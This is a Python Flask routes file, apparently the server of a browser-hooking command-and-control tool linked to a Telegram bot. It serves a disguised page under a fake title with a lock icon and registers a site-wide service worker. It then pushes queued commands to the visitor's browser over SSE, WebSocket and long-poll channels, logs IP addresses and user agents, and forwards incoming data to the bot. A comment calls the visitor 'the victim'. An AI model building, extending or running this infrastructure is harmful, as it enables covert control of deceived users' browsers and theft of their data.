# lsh/routes.py
# ============================================================
# Flask Routes - WebSocket + SSE + Long Poll + HTTP
# مع Logging شامل + إصلاح bot reference
# ============================================================

import os
import json
import time
import uuid
import queue
import threading

from flask import request, jsonify, Response, stream_with_context

from .config import (
    redis_client, RAILWAY_URL, LSH_CONFIG,
    ws_connections, ws_lock,
    sse_connections, sse_lock,
    streams_available,
)
from .session_mgr import (
    create_session, get_session, update_session,
    delete_session, session_exists, update_presence,
    refresh_session_ttl,
)
from .commands import (
    pop_commands, mark_session_active, push_command,
    ack_command, nack_command, get_pending_count,
    get_dead_letters, retry_dead_letters,
)
from .handlers import _handle_incoming
from .templates import LSH_PAGE, SW_FALLBACK

from logging_config import get_logger

logger = get_logger("lsh.routes")


# ============================================================
# Init Routes
# ============================================================
def init_lsh_routes(app, bot):
    """تسجيل كل مسارات LSH"""

    # ★★ تأكد إن bot مش None ★★
    if bot is None:
        logger.error("❌ [INIT] bot is None! LSH will not work properly.")
    else:
        logger.info(f"✅ [INIT] bot registered with LSH routes")

    # ============================================================
    # Service Worker
    # ============================================================
    @app.route('/sw.js', methods=['GET'])
    def serve_sw():
        try:
            base_dir = os.path.dirname(os.path.abspath(__file__))
            sw_path = os.path.join(base_dir, 'sw.js')

            if os.path.exists(sw_path):
                with open(sw_path, 'r', encoding='utf-8') as f:
                    content = f.read()
            else:
                content = SW_FALLBACK

            logger.info(f"[/sw.js] Served SW ({len(content)} bytes)")

            return Response(
                content,
                mimetype='application/javascript',
                headers={
                    'Service-Worker-Allowed': '/',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Access-Control-Allow-Origin': '*',
                }
            )
        except Exception as e:
            logger.exception(f"serve_sw error: {e}")
            return Response(SW_FALLBACK, mimetype='application/javascript')

    # ============================================================
    # Manifest
    # ============================================================
    @app.route('/manifest.json', methods=['GET'])
    def serve_manifest():
        manifest = {
            "name": LSH_CONFIG["fake_title"],
            "short_name": "Sec",
            "start_url": "/",
            "display": "standalone",
            "background_color": "#f5f7fa",
            "theme_color": "#2563eb",
            "orientation": "portrait",
            "icons": [{
                "src": "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E🔒%3C/text%3E%3C/svg%3E",
                "sizes": "192x192",
                "type": "image/svg+xml",
                "purpose": "any maskable"
            }]
        }
        logger.info("[/manifest.json] Served manifest")
        return jsonify(manifest), 200

    # ============================================================
    # Main Page
    # ============================================================
    @app.route('/lsh', methods=['GET'])
    def lsh_page():
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')

        logger.info(
            f"📄 [LSh PAGE] request from {request.remote_addr} | "
            f"s={session_id[:16] if session_id else 'None'} | "
            f"id={chat_id}"
        )

        if not session_id or not chat_id:
            logger.warning("[LSh PAGE] Missing s or id")
            return "Invalid link", 400

        # إنشاء الجلسة لو مش موجودة
        if not session_exists(session_id):
            create_session(session_id, chat_id)
            logger.info(f"[LSh PAGE] Created new session: {session_id[:8]}")
        else:
            sess = get_session(session_id)
            stored_chat_id = sess.get("chat_id") if sess else None
            logger.info(
                f"[LSh PAGE] Existing session: {session_id[:8]} | "
                f"stored_chat_id={stored_chat_id}"
            )

        # تحديث Presence
        update_presence(session_id, "http")

        # ★ استبدل القيم في الصفحة
        try:
            ws_url = (
                RAILWAY_URL
                .replace("https://", "wss://")
                .replace("http://", "ws://")
                + "/lsh_ws?s=" + session_id
                + "&id=" + str(chat_id)
            )

            html = (
                LSH_PAGE
                .replace("__SESSION_ID__", session_id)
                .replace("__CHAT_ID__", str(chat_id))
                .replace("__HTTP_URL__", RAILWAY_URL)
                .replace("__WS_URL__", ws_url)
            )

            logger.info(
                f"📄 [LSh PAGE] Rendered HTML ({len(html)} bytes) | "
                f"HTTP_URL={RAILWAY_URL} | WS_URL={ws_url[:80]}..."
            )

            return Response(html, mimetype='text/html')

        except Exception as e:
            logger.exception(f"[LSh PAGE] Render error: {e}")
            return "Render error", 500

    # ============================================================
    # SSE Stream
    # ============================================================
    @app.route('/lsh_sse', methods=['GET'])
    def lsh_sse():
        """قناة SSE للضحية"""
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')

        logger.info(
            f"📡 [LSh SSE] Connection from {request.remote_addr} | "
            f"s={session_id[:16] if session_id else 'None'}"
        )

        if not session_id or not chat_id:
            return "Invalid", 400

        sse_queue = queue.Queue(maxsize=100)
        with sse_lock:
            sse_connections[session_id] = sse_queue

        update_presence(session_id, "sse")

        def generate():
            try:
                yield f"data: {json.dumps({'type': 'connected', 'session_id': session_id})}\n\n"

                last_heartbeat = time.time()

                while True:
                    try:
                        cmd = sse_queue.get(timeout=25)
                        yield f"data: {json.dumps({'type': 'command', 'cmd': cmd})}\n\n"
                        logger.info(f"📡 [LSh SSE] Sent command to {session_id[:8]}")
                    except queue.Empty:
                        now = time.time()
                        if now - last_heartbeat > 20:
                            yield f": heartbeat\n\n"
                            yield f"data: {json.dumps({'type': 'heartbeat', 'ts': now})}\n\n"
                            last_heartbeat = now

            except GeneratorExit:
                logger.info(f"[LSh SSE] Closed: {session_id[:8]}")
            except Exception as e:
                logger.exception(f"[LSh SSE] Error: {e}")
            finally:
                with sse_lock:
                    sse_connections.pop(session_id, None)
                update_session(session_id, sse_connected=False)

        return Response(
            stream_with_context(generate()),
            mimetype='text/event-stream',
            headers={
                'Cache-Control': 'no-cache',
                'X-Accel-Buffering': 'no',
                'Connection': 'keep-alive',
                'Access-Control-Allow-Origin': '*',
            }
        )

    # ============================================================
    # Long Poll
    # ============================================================
    @app.route('/lsh_longpoll', methods=['GET'])
    def lsh_longpoll():
        """Long-polling للأوامر"""
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')
        timeout = int(request.args.get('t', '25'))

        if not session_id or not chat_id:
            return jsonify({"commands": []}), 200

        update_presence(session_id, "long_poll")

        start = time.time()
        commands = []

        while time.time() - start < timeout:
            commands = pop_commands(session_id, max_count=10)
            if commands:
                break
            time.sleep(0.5)

        mark_session_active(session_id)
        refresh_session_ttl(session_id)

        return jsonify({
            "commands": commands,
            "ok": True,
            "ts": time.time(),
        }), 200

    # ============================================================
    # ★★★ Main Message Route — الأهم ★★★
    # ============================================================
    @app.route('/lsh_msg', methods=['POST'])
    def lsh_msg():
        try:
            # ★★★ 1. اقرأ البيانات ★★★
            data = request.get_json(silent=True) or {}
            session_id = data.get('session_id')
            chat_id = data.get('chat_id')
            dtype = data.get('type')

            # ★★★ 2. LOG كل رسالة ★★★
            logger.info(
                f"📩 [lsh_msg] dtype={dtype} | "
                f"session={session_id[:16] if session_id else 'None'} | "
                f"chat_id={chat_id} (type={type(chat_id).__name__}) | "
                f"IP={request.remote_addr}"
            )

            # ★★★ 3. تحقق من البيانات ★★★
            if not session_id or not chat_id:
                logger.warning(
                    f"❌ Missing data: session_id={session_id}, chat_id={chat_id}"
                )
                return jsonify({"commands": [], "ok": False}), 200

            # ★★★ 4. جلسة ★★★
            sess = get_session(session_id)

            if sess:
                stored_chat_id = sess.get("chat_id")

                # ★★ تحقق من تطابق chat_id ★★
                if str(stored_chat_id).strip() != str(chat_id).strip():
                    logger.warning(
                        f"⚠️ chat_id MISMATCH! "
                        f"Session has '{stored_chat_id}', request has '{chat_id}'"
                    )

                sess["last_seen"] = time.time()
                sess["last_activity"] = time.time()
                logger.debug(f"Session found: {session_id[:8]}")
            else:
                logger.info(f"🆕 Creating new session: {session_id[:8]} → chat_id={chat_id}")
                create_session(session_id, chat_id)

            # ★★★ 5. Presence ★★★
            update_presence(session_id, "http")

            # ★★★ 6. Ping Response ★★★
            if dtype == 'ping':
                logger.debug(f"Ping response for {session_id[:8]}")
                return jsonify({
                    "commands": [],
                    "ok": True,
                    "pong": time.time(),
                    "server_time": time.time(),
                }), 200

            # ★★★ 7. معالجة الرسائل (مش ping) ★★★
            skip_types = (
                'ping', 'sw_ping', 'page_ping',
                'auto_ping', 'health_check'
            )

            if dtype and dtype not in skip_types:
                # ★★ IP ★★
                source_ip = (
                    request.headers.get('CF-Connecting-IP') or
                    request.headers.get('X-Forwarded-For') or
                    request.remote_addr or
                    "Unknown"
                )

                if ', ' in source_ip:
                    source_ip = source_ip.split(',')[0].strip()

                # ★★ تحديث الجلسة ★★
                update_session(
                    session_id,
                    ip=source_ip,
                    user_agent=request.headers.get('User-Agent', '')[:200],
                )

                # ★★★ تحقق من bot قبل الإرسال ★★★
                if bot is None:
                    logger.error(
                        f"❌ [lsh_msg] bot is None! Cannot handle dtype={dtype}. "
                        f"Check if init_lsh_routes was called with valid bot."
                    )
                else:
                    logger.info(
                        f"🚀 [lsh_msg] Calling _handle_incoming for dtype={dtype} | "
                        f"chat_id={chat_id} | IP={source_ip} | bot_ok=True"
                    )

                    try:
                        _handle_incoming(bot, chat_id, session_id, data, source_ip)
                        logger.info(f"✅ [lsh_msg] _handle_incoming completed for {dtype}")
                    except Exception as he:
                        logger.exception(f"❌ [lsh_msg] _handle_incoming error: {he}")

            # ★★★ 8. جلب الأوامر من Redis ★★★
            commands = pop_commands(session_id, max_count=10)
            mark_session_active(session_id)
            refresh_session_ttl(session_id)

            if commands:
                logger.info(
                    f"📤 Returning {len(commands)} commands for {session_id[:8]}"
                )

            # ★★★ 9. Response ★★★
            return jsonify({
                "commands": commands,
                "ok": True,
                "server_time": time.time(),
            }), 200

        except Exception as e:
            logger.exception(f"❌ [lsh_msg] FATAL: {e}")
            return jsonify({"commands": [], "ok": False}), 200

    # ============================================================
    # Create Session
    # ============================================================
    @app.route('/lsh_create', methods=['POST'])
    def lsh_create():
        try:
            data = request.get_json(silent=True) or {}
            chat_id = data.get('chat_id')
            provided_session_id = data.get('session_id')

            logger.info(
                f"🆕 [LSh CREATE] chat_id={chat_id} | "
                f"session_id={provided_session_id[:16] if provided_session_id else 'None'}"
            )

            if not chat_id:
                logger.warning("[LSh CREATE] Missing chat_id")
                return jsonify({"error": "missing chat_id"}), 400

            session_id = (
                provided_session_id or
                str(uuid.uuid4()).replace('-', '')[:24]
            )

            # ★★★ تحقق إذا الجلسة موجودة ★★★
            existing = get_session(session_id)
            if existing:
                stored_chat_id = existing.get("chat_id")
                logger.info(
                    f"[LSh CREATE] Session already exists | "
                    f"stored_chat_id={stored_chat_id} | new_chat_id={chat_id}"
                )

                if str(stored_chat_id).strip() != str(chat_id).strip():
                    logger.warning(
                        f"⚠️ chat_id conflict! Updating from '{stored_chat_id}' to '{chat_id}'"
                    )

            create_session(session_id, chat_id)

            logger.info(
                f"✅ [LSh CREATE] Session created: {session_id[:8]} → chat_id={chat_id}"
            )

            return jsonify({"session_id": session_id}), 200

        except Exception as e:
            logger.exception(f"❌ [LSh CREATE] error: {e}")
            return jsonify({"error": str(e)}), 500

    # ============================================================
    # Health Check
    # ============================================================
    @app.route('/lsh_health', methods=['GET'])
    def lsh_health():
        session_id = request.args.get('s', '')
        sess = get_session(session_id) if session_id else None

        return jsonify({
            "status": "ok",
            "server_time": time.time(),
            "redis": bool(redis_client),
            "streams": bool(streams_available),
            "bot_ready": bot is not None,
            "session": {
                "exists": sess is not None,
                "chat_id": sess.get("chat_id") if sess else None,
                "last_seen": sess.get("last_seen") if sess else None,
                "channel": sess.get("channel") if sess else None,
                "presence": sess.get("presence") if sess else None,
                "pending_commands": get_pending_count(session_id) if session_id else 0,
            } if sess else None
        }), 200

    # ============================================================
    # Ack Command
    # ============================================================
    @app.route('/lsh_ack', methods=['POST'])
    def lsh_ack():
        data = request.get_json(silent=True) or {}
        session_id = data.get('session_id')
        cmd_id = data.get('cmd_id')
        status = data.get('status', 'ok')
        reason = data.get('reason', '')

        if not session_id or not cmd_id:
            return jsonify({"ok": False}), 200

        if status == 'ok':
            ack_command(session_id, cmd_id)
        else:
            nack_command(session_id, cmd_id, reason)

        return jsonify({"ok": True}), 200

    # ============================================================
    # Dead Letters
    # ============================================================
    @app.route('/lsh_dl', methods=['GET'])
    def lsh_dl():
        session_id = request.args.get('s', '')
        if not session_id:
            return jsonify({"items": []}), 200
        return jsonify({
            "items": get_dead_letters(session_id),
        }), 200

    # ============================================================
    # Stats
    # ============================================================
    @app.route('/lsh_stats', methods=['GET'])
    def lsh_stats():
        session_id = request.args.get('s', '')
        if not session_id:
            return jsonify({"error": "missing session"}), 400

        sess = get_session(session_id)
        if not sess:
            return jsonify({"error": "session not found"}), 404

        return jsonify({
            "session_id": session_id,
            "chat_id": sess.get("chat_id"),
            "presence": sess.get("presence"),
            "channel": sess.get("channel"),
            "rtt_ms": sess.get("rtt_ms"),
            "reconnect_count": sess.get("reconnect_count"),
            "pending_commands": get_pending_count(session_id),
            "dead_letters": len(get_dead_letters(session_id)),
            "ws_connected": sess.get("ws_connected", False),
            "sse_connected": sess.get("sse_connected", False),
            "last_seen": sess.get("last_seen"),
        }), 200

    # ============================================================
    # ★★★ Debug — عرض الجلسات ★★★
    # ============================================================
    @app.route('/lsh_debug', methods=['GET'])
    def lsh_debug():
        """يعرض كل الجلسات (للتشخيص)"""
        from .session_mgr import get_all_sessions

        sessions_list = []
        for sess in get_all_sessions():
            sessions_list.append({
                "session_id": sess.get("session_id", "")[:16],
                "chat_id": sess.get("chat_id"),
                "chat_id_type": type(sess.get("chat_id")).__name__,
                "created_at": sess.get("created_at"),
                "last_seen": sess.get("last_seen"),
                "channel": sess.get("channel"),
                "presence": sess.get("presence"),
                "pending_commands": get_pending_count(sess.get("session_id", "")),
            })

        return jsonify({
            "total_sessions": len(sessions_list),
            "sessions": sessions_list,
            "redis_connected": bool(redis_client),
            "streams_available": bool(streams_available),
            "bot_ready": bot is not None,
            "railway_url": RAILWAY_URL,
        }), 200

    # ============================================================
    # ★★★ Test Send — اختبار إرسال رسالة ★★★
    # ============================================================
    @app.route('/lsh_test_send', methods=['POST'])
    def lsh_test_send():
        """اختبار إرسال رسالة للـ chat_id"""
        try:
            data = request.get_json(silent=True) or {}
            chat_id = data.get('chat_id')
            text = data.get('text', '🧪 رسالة اختبار من LSH')

            if not chat_id:
                return jsonify({"error": "missing chat_id"}), 400

            logger.info(f"🧪 [TEST SEND] chat_id={chat_id} | text={text}")

            if bot is None:
                logger.error("❌ [TEST SEND] bot is None!")
                return jsonify({
                    "ok": False,
                    "error": "bot is None - not initialized",
                }), 500

            try:
                cid = int(str(chat_id).strip()) if str(chat_id).strip().isdigit() else chat_id
                result = bot.send_message(cid, text)

                logger.info(f"✅ [TEST SEND] Sent to {cid} successfully")
                return jsonify({
                    "ok": True,
                    "chat_id": cid,
                    "message_id": result.message_id,
                }), 200

            except Exception as send_err:
                logger.exception(f"❌ [TEST SEND] Failed: {send_err}")
                return jsonify({
                    "ok": False,
                    "error": str(send_err),
                }), 500

        except Exception as e:
            logger.exception(f"❌ [TEST SEND] FATAL: {e}")
            return jsonify({"error": str(e)}), 500

    logger.info(
        "LSH Routes registered: /sw.js /manifest.json /lsh /lsh_sse /lsh_longpoll "
        "/lsh_msg /lsh_create /lsh_health /lsh_ack /lsh_dl /lsh_stats /lsh_debug /lsh_test_send"
    )
